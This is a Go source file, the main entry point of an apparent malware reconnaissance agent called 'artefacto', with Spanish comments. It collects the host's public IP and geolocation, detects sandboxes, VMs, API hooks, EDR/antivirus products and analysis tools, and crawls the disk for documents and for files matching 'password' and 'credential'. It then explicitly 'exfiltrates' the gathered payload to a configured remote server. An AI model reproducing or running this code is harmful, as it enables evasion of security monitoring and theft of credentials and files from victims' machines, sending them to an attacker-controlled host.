package main

import (
	"fmt"
	"log"
	"os"
	"sync"
	"time"

	"github.com/m4rcmo15/artefacto/collectors"
	"github.com/m4rcmo15/artefacto/config"
	"github.com/m4rcmo15/artefacto/exfil"
	"github.com/m4rcmo15/artefacto/models"
)

func main() {
	fmt.Println("[*] Iniciando agente de detección de sandbox...")

	// Cargar configuración
	cfg := config.Load()

	// Obtener hostname
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	// Crear payload principal
	payload := &models.Payload{
		Timestamp: time.Now(),
		Hostname:  hostname,
	}

	// Obtener IP pública y geolocalización (antes de los colectores paralelos)
	fmt.Println("[+] Obteniendo IP pública...")
	payload.PublicIP = collectors.GetPublicIP()
	if payload.PublicIP != "" {
		fmt.Printf("[✓] IP pública: %s\n", payload.PublicIP)
		fmt.Println("[+] Obteniendo geolocalización...")
		payload.GeoLocation = collectors.GetGeoLocation(payload.PublicIP)
		if payload.GeoLocation != nil {
			fmt.Printf("[✓] Ubicación: %s, %s\n", payload.GeoLocation.City, payload.GeoLocation.Country)
		}
	}

	// WaitGroup para ejecutar colectores en paralelo
	var wg sync.WaitGroup
	wg.Add(6)

	// 1. CheckSandbox
	go func() {
		defer wg.Done()
		fmt.Println("[+] Ejecutando CheckSandbox...")
		payload.SandboxInfo = collectors.CheckSandbox()
		fmt.Println("[✓] CheckSandbox completado")
	}()

	// 2. SystemInfo
	go func() {
		defer wg.Done()
		fmt.Println("[+] Ejecutando SystemInfo...")
		payload.SystemInfo = collectors.CollectSystemInfo()
		fmt.Println("[✓] SystemInfo completado")
	}()

	// 3. HookDetector
	go func() {
		defer wg.Done()
		fmt.Println("[+] Ejecutando HookDetector...")
		payload.HookInfo = collectors.DetectHooks()
		fmt.Println("[✓] HookDetector completado")
	}()

	// 4. FileCrawler
	go func() {
		defer wg.Done()
		fmt.Println("[+] Ejecutando FileCrawler...")
		patterns := []string{"*.txt", "*.doc", "*.pdf", "password", "credential"}
		payload.CrawlerInfo = collectors.CrawlFiles(patterns, 100)
		fmt.Println("[✓] FileCrawler completado")
	}()

	// 5. EDRChecker
	go func() {
		defer wg.Done()
		fmt.Println("[+] Ejecutando EDRChecker...")
		payload.EDRInfo = collectors.DetectEDR()
		fmt.Println("[✓] EDRChecker completado")
	}()

	// 6. ToolsDetector
	go func() {
		defer wg.Done()
		fmt.Println("[+] Ejecutando ToolsDetector...")
		payload.ToolsInfo = collectors.DetectTools()
		fmt.Println("[✓] ToolsDetector completado")
	}()

	// Esperar a que todos los colectores terminen
	wg.Wait()

	fmt.Println("\n[*] Todos los colectores completados")
	fmt.Println("[*] Exfiltrando datos...")

	// Enviar payload al servidor
	err = exfil.SendPayload(payload, cfg.ServerURL, cfg.Timeout)
	if err != nil {
		log.Printf("[!] Error enviando datos: %v", err)
		
		// Guardar localmente si falla el envío
		savePayloadLocally(payload)
	} else {
		fmt.Println("[✓] Datos enviados correctamente al servidor")
	}

	// Mostrar resumen
	printSummary(payload)
}

func savePayloadLocally(payload *models.Payload) {
	// TODO: Guardar payload en archivo local como backup
	fmt.Println("[*] Guardando payload localmente...")
}

func printSummary(payload *models.Payload) {
	fmt.Println("\n========== RESUMEN ==========")
	
	if payload.SandboxInfo != nil {
		fmt.Printf("¿Es VM?: %v\n", payload.SandboxInfo.IsVM)
		fmt.Printf("Indicadores de VM: %d\n", len(payload.SandboxInfo.VMIndicators))
	}

	if payload.SystemInfo != nil {
		fmt.Printf("CPUs: %d\n", payload.SystemInfo.CPUCount)
		fmt.Printf("RAM: %d MB\n", payload.SystemInfo.TotalRAM)
		fmt.Printf("Procesos: %d\n", len(payload.SystemInfo.Processes))
	}

	if payload.HookInfo != nil {
		hookedCount := 0
		for _, fn := range payload.HookInfo.HookedFunctions {
			if fn.IsHooked {
				hookedCount++
			}
		}
		fmt.Printf("Funciones hooked: %d/%d\n", hookedCount, len(payload.HookInfo.HookedFunctions))
	}

	if payload.CrawlerInfo != nil {
		fmt.Printf("Archivos encontrados: %d\n", payload.CrawlerInfo.TotalFiles)
	}

	if payload.EDRInfo != nil {
		fmt.Printf("EDR/AV detectados: %d\n", len(payload.EDRInfo.DetectedProducts))
		for _, product := range payload.EDRInfo.DetectedProducts {
			fmt.Printf("  - %s (método: %s)\n", product.Name, product.Method)
		}
	}

	if payload.ToolsInfo != nil {
		totalTools := len(payload.ToolsInfo.ReversingTools) + len(payload.ToolsInfo.DebuggingTools) + 
			len(payload.ToolsInfo.MonitoringTools) + len(payload.ToolsInfo.VirtualizationTools) + 
			len(payload.ToolsInfo.AnalysisTools)
		fmt.Printf("Herramientas detectadas: %d\n", totalTools)
	}

	if payload.GeoLocation != nil {
		fmt.Printf("Ubicación: %s, %s (%s)\n", payload.GeoLocation.City, payload.GeoLocation.Country, payload.GeoLocation.CountryCode)
	}

	fmt.Println("=============================")
}
